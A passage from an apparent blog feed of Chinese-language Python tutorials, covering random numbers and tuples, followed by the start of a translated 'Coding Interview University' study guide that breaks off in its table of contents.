class="keyword">with</span> <span class="number">42.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.6394267984578837</span></span><br><span class="line"><span class="number">1.2250967970040025</span></span><br><span class="line">E</span><br><span class="line"></span><br><span class="line">Re-seeding <span class="keyword">with</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.13436424411240122</span></span><br><span class="line"><span class="number">8.626903632435095</span></span><br><span class="line">B</span><br><span class="line"></span><br><span class="line">Re-seeding <span class="keyword">with</span> <span class="number">42.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.6394267984578837</span></span><br><span class="line"><span class="number">1.2250967970040025</span></span><br><span class="line">E</span><br></pre></td></tr></table></figure><h3><span id="secrets-mo-kuai"><code>secrets</code> 模块</span></h3><p><code>secrets</code> 模块用于生成适合于管理数据（例如密码，帐户身份验证，安全令牌和相关机密）的密码学上强的随机数。</p><p>特别是，应优先使用<code>secrets</code> 而不是 <code>random</code> 模块中默认的伪随机数生成器，后者是为建模和仿真而设计的，而不是安全或加密技术。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, n) 之间的随机整数。</span></span><br><span class="line">a = secrets.randbelow(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回具有k个随机位的整数。</span></span><br><span class="line">a = secrets.randbits(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从序列中选择一个随机元素</span></span><br><span class="line">a = secrets.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">E</span><br></pre></td></tr></table></figure><h3><span id="numpy-de-sui-ji-shu">NumPy的随机数</span></h3><p>为多维数组创建随机数。NumPy伪随机数生成器与Python标准库伪随机数生成器不同。</p><p>重要的是，设置Python伪随机数生成器种子不会影响NumPy伪随机数生成器，必须单独设置和使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># rand(d0,d1,…,dn)</span></span><br><span class="line"><span class="comment"># 生成随机浮点数的多维数组, 数组大小为 (d0,d1,…,dn)</span></span><br><span class="line"><span class="built_in">print</span>(np.random.rand(<span class="number">3</span>))</span><br><span class="line"><span class="comment"># 重设随机种子</span></span><br><span class="line">np.random.seed(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(np.random.rand(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 [a,b) 之间随机整数的多维数组，大小为 n</span></span><br><span class="line">values = np.random.randint(<span class="number">0</span>, <span class="number">10</span>, (<span class="number">5</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(values)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用正态分布值生成多维数组，数组大小为 (d0,d1,…,dn)</span></span><br><span class="line"><span class="comment"># 来自标准正态分布的平均值为0.0且标准偏差为1.0的值</span></span><br><span class="line">values = np.random.randn(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(values)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机排列一个多维数组.</span></span><br><span class="line"><span class="comment"># 仅沿多维数组的第一轴随机排列数组</span></span><br><span class="line">arr = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line">np.random.shuffle(arr)</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">4.17022005e-01</span> <span class="number">7.20324493e-01</span> <span class="number">1.14374817e-04</span>]</span><br><span class="line">[<span class="number">4.17022005e-01</span> <span class="number">7.20324493e-01</span> <span class="number">1.14374817e-04</span>]</span><br><span class="line">[[<span class="number">5</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">7</span> <span class="number">6</span>]</span><br><span class="line"> [<span class="number">9</span> <span class="number">2</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">5</span> <span class="number">2</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">2</span> <span class="number">4</span> <span class="number">7</span>]]</span><br><span class="line">[-<span class="number">2.29230928</span> -<span class="number">1.41555249</span>  <span class="number">0.8858294</span>   <span class="number">0.63190187</span>  <span class="number">0.04026035</span>]</span><br><span class="line">[[<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line"> [<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]]</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      12. 随机数 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>02. Tuple — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-119/"/>
    <id>https://qiwihui.com/qiwihui-blog-119/</id>
    <published>2022-08-13T01:54:25.570Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>元组（Tuple）是对象的集合，它有序且不可变。 元组类似于列表，主要区别在于不可变性。 在Python中，元组用圆括号和逗号分隔的值书写。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple = (<span class="string">&quot;Max&quot;</span>, <span class="number">28</span>, <span class="string">&quot;New York&quot;</span>)</span><br></pre></td></tr></table></figure><h3><span id="shi-yong-yuan-zu-er-bu-shi-yong-lie-biao-de-yuan-yin">使用元组而不使用列表的原因</span></h3><ul><li>通常用于属于同一目标的对象。</li><li>将元组用于异构（不同）数据类型，将列表用于同类（相似）数据类型。</li><li>由于元组是不可变的，因此通过元组进行迭代比使用列表进行迭代要快一些。</li><li>具有不可变元素的元组可以用作字典的键。 使用列表做为键是不可能的。</li><li>如果你有不变的数据，则将其实现为元组将确保其有写保护。</li></ul><h3><span id="chuang-jian-yuan-zu">创建元组</span></h3><p>用圆括号和逗号分隔的值创建元组，或使用内置的 <code>tuple</code> 函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple_1 = (<span class="string">&quot;Max&quot;</span>, <span class="number">28</span>, <span class="string">&quot;New York&quot;</span>)</span><br><span class="line">tuple_2 = <span class="string">&quot;Linda&quot;</span>, <span class="number">25</span>, <span class="string">&quot;Miami&quot;</span> <span class="comment"># 括弧可选</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊情况：只有一个元素的元组需要在在最后添加逗号，否则不会被识别为元组</span></span><br><span class="line">tuple_3 = (<span class="number">25</span>,)</span><br><span class="line"><span class="built_in">print</span>(tuple_1)</span><br><span class="line"><span class="built_in">print</span>(tuple_2)</span><br><span class="line"><span class="built_in">print</span>(tuple_3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用内置 tuple 函数将可迭代对象（list，dict，string）转变为元组</span></span><br><span class="line">tuple_4 = <span class="built_in">tuple</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(tuple_4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;Max&#x27;</span>, <span class="number">28</span>, <span class="string">&#x27;New York&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;Linda&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;Miami&#x27;</span>)</span><br><span class="line">(<span class="number">25</span>,)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3><span id="fang-wen-yuan-su">访问元素</span></h3><p>可以通过引用索引号访问元组项。 请注意，索引从0开始。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = tuple_1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br><span class="line"><span class="comment"># 你也可以使用负索引，比如 -1 表示最后一个元素，-2 表示倒数第二个元素，以此类推</span></span><br><span class="line">item = tuple_1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line">New York</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-huo-zhe-xiu-gai-yuan-su">添加或者修改元素</span></h3><p>不可能，会触发 <code>TypeError</code> 错误。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple_1[<span class="number">2</span>] = <span class="string">&quot;Boston&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">    TypeError                                 Traceback (most recent call last)</span><br><span class="line">    &lt;ipython-input-5-c391d8981369&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    ----&gt; 1 tuple_1[2] = <span class="string">&quot;Boston&quot;</span></span><br><span class="line"></span><br><span class="line">    TypeError: <span class="string">&#x27;tuple&#x27;</span> object does not support item assignment</span><br></pre></td></tr></table></figure><h3><span id="shan-chu-yuan-zu">删除元组</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> tuple_2</span><br></pre></td></tr></table></figure><h3><span id="die-dai">迭代</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 for 循环迭代元组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tuple_1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line"><span class="number">28</span></span><br><span class="line">New York</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-yuan-su-shi-fou-cun-zai">检查元素是否存在</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;New York&quot;</span> <span class="keyword">in</span> tuple_1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="you-yong-de-fang-fa">有用的方法</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple = (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,)</span><br><span class="line"></span><br><span class="line"><span class="comment"># len() : 获取元组元素个数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_tuple))</span><br><span class="line"></span><br><span class="line"><span class="comment"># count(x) : 返回与 x 相等的元素个数</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple.count(<span class="string">&#x27;p&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># index(x) : 返回与 x 相等的第一个元素索引</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple.index(<span class="string">&#x27;l&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复</span></span><br><span class="line">my_tuple = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接</span></span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) + (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将列表转为元组，以及将元组转为列表</span></span><br><span class="line">my_list = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">list_to_tuple = <span class="built_in">tuple</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(list_to_tuple)</span><br><span class="line"></span><br><span class="line">tuple_to_list = <span class="built_in">list</span>(list_to_tuple)</span><br><span class="line"><span class="built_in">print</span>(tuple_to_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert string to tuple</span></span><br><span class="line">string_to_tuple = <span class="built_in">tuple</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(string_to_tuple)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">(<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="qie-pian">切片</span></h3><p>和字符串一样，使用冒号（<code>:</code>）访问列表的子部分。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a[start:stop:step], 默认步长为 1</span></span><br><span class="line">a = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">b = a[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># 注意，最后一个索引不包括</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[<span class="number">2</span>:] <span class="comment"># 知道最后</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[:<span class="number">3</span>] <span class="comment"># 从最前头开始</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[::<span class="number">2</span>] <span class="comment"># 从前往后没两个元素</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[::-<span class="number">1</span>] <span class="comment"># 翻转元组</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>元组解包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 变量个数必需与元组元素个数相同</span></span><br><span class="line">tuple_1 = (<span class="string">&quot;Max&quot;</span>, <span class="number">28</span>, <span class="string">&quot;New York&quot;</span>)</span><br><span class="line">name, age, city = tuple_1</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(age)</span><br><span class="line"><span class="built_in">print</span>(city)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示: 使用 * 解包多个元素到列表</span></span><br><span class="line">my_tuple = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">item_first, *items_between, item_last = my_tuple</span><br><span class="line"><span class="built_in">print</span>(item_first)</span><br><span class="line"><span class="built_in">print</span>(items_between)</span><br><span class="line"><span class="built_in">print</span>(item_last)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line"><span class="number">28</span></span><br><span class="line">New York</span><br><span class="line"><span class="number">0</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h3><span id="qian-tao-yuan-zu">嵌套元组</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = ((<span class="number">0</span>, <span class="number">1</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;height&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((<span class="number">0</span>, <span class="number">1</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;height&#x27;</span>))</span><br><span class="line">(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="bi-jiao-yuan-zu-he-lie-biao">比较元组和列表</span></h3><p>元组的不可变性使Python可以进行内部优化。 因此，在处理大数据时，元组可以更高效。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 比较大小</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">my_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">True</span>]</span><br><span class="line">my_tuple = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(my_list), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(my_tuple), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较列表和元组创建语句的执行时间</span></span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="built_in">print</span>(timeit.timeit(stmt=<span class="string">&quot;[0, 1, 2, 3, 4, 5]&quot;</span>, number=<span class="number">1000000</span>))</span><br><span class="line"><span class="built_in">print</span>(timeit.timeit(stmt=<span class="string">&quot;(0, 1, 2, 3, 4, 5)&quot;</span>, number=<span class="number">1000000</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">104</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">88</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">0.12474981700000853</span></span><br><span class="line"><span class="number">0.014836141000017733</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      02. Tuple — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>编码面试学习手册（Coding Interview University）</title>
    <link href="https://qiwihui.com/qiwihui-blog-109/"/>
    <id>https://qiwihui.com/qiwihui-blog-109/</id>
    <published>2022-08-13T01:54:25.570Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文地址： <a href="https://github.com/jwasham/coding-interview-university">https://github.com/jwasham/coding-interview-university</a>基于2020年10月30日的原文版本翻译和校对</p></blockquote><p>原先我为了成为一个软件工程师而建立这份简单的学习主题清单， 但这份清单随着时间而膨胀成今天这样。在做完这份清单上的每个目标后，<a href="https://startupnextdoor.com/ive-been-acquired-by-amazon/?src=ciu">我成为了 Amazon 的软件开发工程师</a>! 你或许不需要像我一样学习这么多。但是，让你成为一位称职工程师所需要的知识都在这里了。</p><p>我每天自学8~12小时，这样持续了好几个月。这是我的故事：<a href="https://medium.freecodecamp.org/why-i-studied-full-time-for-8-months-for-a-google-interview-cc662ce9bb13">为什么我为了 Google 面试而自学了8个月</a>。</p><p>在这份清单内的主题会让你拥有足够的知识去面对几乎每家软件公司的技术面试，包括科技巨头：Amazon、Facebook、Google，以及 Microsoft。</p><p>祝你好运!</p><span id="more"></span><h2><span id="zhe-shi">这是？</span></h2><p>这是我为了从 web 开发者（自学、非计算机科学学位）蜕变至 Google 软件工程师所制定的计划，其内容历时数月。</p><p><img src="https://d3j2pkmjtin6ou.cloudfront.net/coding-at-the-whiteboard-silicon-valley.png" alt="白板上编程 ———— 来自 HBO 频道的剧集，“硅谷”"></p><p>这份清单适用于 <strong>新手软件工程师</strong>，或者想从软件/网站开发转向软件工程（需要计算机科学知识）的人员。如果你有多年的经验，并且声称拥有多年的软件工程经验，并且期待一次更艰难的面试。</p><p>如果你具有多年的软件/网页开发经验，请注意，大型软件公司（例如 Google，Amazon，Facebook 和 Microsoft）将软件工程视为不同于软件/网页开发，并且它们需要计算机科学知识。</p><p>如果你想成为可靠性工程师或运维工程师，请从可选列表（网络，安全）中学习更多。</p><hr><h2><span id="mu-lu">目录</span></h2><ul><li><a href="#%E8%BF%99%E6%98%AF">这是？</a></li><li><a href="#%E4%B8%BA%E4%BD%95%E8%A6%81%E7%94%A8%E5%88%B0%E5%AE%83">为何要用到它？</a></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%AE%83">如何使用它</a></li><li><a href="#%E4%B8%8D%E8%A6%81%E8%A7%89%E5%BE%97%E8%87%AA%E5%B7%B1%E4%B8%8D%E5%A4%9F%E8%81%AA%E6%98%8E">不要觉得自己不够聪明</a></li><li><a href="#%E7%9B%B8%E5%85%B3%E8%A7%86%E9%A2%91%E8%B5%84%E6%BA%90">相关视频资源</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E8%BF%87%E7%A8%8B--%E9%80%9A%E7%94%A8%E7%9A%84%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87">面试过程 &amp; 通用的面试准备</a></li><li><a href="#%E4%B8%BA%E4%BD%A0%E7%9A%84%E9%9D%A2%E8%AF%95%E9%80%89%E6%8B%A9%E4%B8%80%E7%A7%8D%E8%AF%AD%E8%A8%80">为你的面试选择一种语言</a></li><li><a href="#%E4%B9%A6%E5%8D%95">书单</a></li><li><a href="#%E5%9C%A8%E4%BD%A0%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">在你开始之前</a></li><li><a href="#%E6%B2%A1%E6%9C%89%E5%8C%85%E5%90%AB%E7%9A%84%E5%86%85%E5%AE%B9">没有包含的内容</a></li><li><a href="#%E5%BF%85%E5%A4%87%E7%9F%A5%E8%AF%86">必备知识</a></li><li><a href="#%E6%97%A5%E5%B8%B8%E8%AE%A1%E5%88%92">日常计划</a></li><li><a href="#%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6--big-o--%E6%B8%90%E8%BF%9B%E5%88%86%E6%9E%90%E6%B3%95">算法复杂度 / Big-O / 渐进分析法</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">数据结构</a><ul><li><a href="#%E6%95%B0%E7%BB%84arrays">数组（Arrays）</a></li><li><a href="#%E9%93%BE%E8%A1%A8linked-lists">链表（Linked Lists）</a></li><li><a href="#%E5%A0%86%E6%A0%88stack">堆栈（Stack）</a></li><li><a href="#%E9%98%9F%E5%88%97queue">队列（Queue）</a></li><li><a href="#%E5%93%88%E5%B8%8C%E8%A1%A8hash-table">哈希表（Hash table）</a></li></ul></li><li><a href="#%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%9F%A5%E8%AF%86">更多的知识</a><ul><li><a href="#%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BEbinary-search">二分查找（Binary search）</a></li><li><a href="#%E6%8C%89%E4%BD%8D%E8%BF%90%E7%AE%97bitwise-operations">按位运算（Bitwise operations）</a></li></ul></li><li><a href="#%E6%A0%91trees">树（Trees）</a><ul><li><a href="#%E6%A0%91--%E7%AC%94%E8%AE%B0--%E8%83%8C%E6%99%AF">树 —— 笔记 &amp; 背景</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91binary-search-treesbsts">二叉查找树（Binary search trees）：BSTs</a></li><li><a href="#%E5%A0%86heap--%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97priority-queue--%E4%BA%8C%E5%8F%89%E5%A0%86binary-heap">堆（Heap） / 优先级队列（Priority Queue） / 二叉堆（Binary Heap）</a></li><li><a href="#%E5%B9%B3%E8%A1%A1%E6%9F%A5%E6%89%BE%E6%A0%91balanced-search-trees">平衡查找树（Balanced search trees）（基本概念，非细节）</a></li><li>遍历：前序、中序、后序、BFS、DFS</li></ul></li><li><a href="#%E6%8E%92%E5%BA%8Fsorting">排序</a><ul><li>选择排序（selection）</li><li>插入排序（insertion）</li><li>堆排序（heapsort）</li><li>快速排序（quicksort）</li><li>归并排序（merge sort）</li></ul></li><li><a href="#%E5%9B%BEgraphs">图（Graphs）</a><ul><li>有向图（directed）</li><li>无向图（undirected）</li><li>邻接矩阵（adjacency matrix）</li><li>邻接表（adjacency list）</li><li>遍历：广度优先(BFS), 深度优先(DFS)</li></ul></li><li><a href="#%E6%9B%B4%E5%A4%9A%E7%9F%A5%E8%AF%86">更多知识</a><ul><li><a href="#%E9%80%92%E5%BD%92recursion">递归</a></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92dynamic-programming">动态规划</a></li><li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B">面向对象编程</a></li><li><a href="#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">设计模式</a></li><li><a href="#%E7%BB%84%E5%90%88combinatorics-n-%E4%B8%AD%E9%80%89-k-%E4%B8%AA--%E6%A6%82%E7%8E%87probability">组合 &amp; 概率</a></li><li><a href="#np-np-%E5%AE%8C%E5%85%A8%E5%92%8C%E8%BF%91%E4%BC%BC%E7%AE%97%E6%B3%95">NP, NP-完全和近似算法</a></li><li><a href="#%E7%BC%93%E5%AD%98cache">缓存</a></li><li><a href="#%E8%BF%9B%E7%A8%8Bprocesse%E5%92%8C%E7%BA%BF%E7%A8%8Bthread">进程和线程</a></li><li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li><li><a href="#%E8%B0%83%E5%BA%A6">调度</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%90%9C%E7%B4%A2%E5%92%8C%E6%93%8D%E4%BD%9C">字符串搜索和操作</a></li><li><a href="#%E5%AD%97%E5%85%B8%E6%A0%91tries">字典树（Tries）</a></li><li><a href="#%E6%B5%AE%E7%82%B9%E6%95%B0">浮点数</a></li><li><a href="#unicode">Unicode</a></li><li><a href="#%E5%AD%97%E8%8A%82%E5%BA%8FEndianness">字节顺序</a></li><li><a href="#%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91">网络</a></li></ul></li><li><a href="#%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%8F%AF%E4%BC%B8%E7%BC%A9%E6%80%A7%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86">系统设计、可伸缩性、数据处理</a>（如果你有4+年经验）</li><li><a 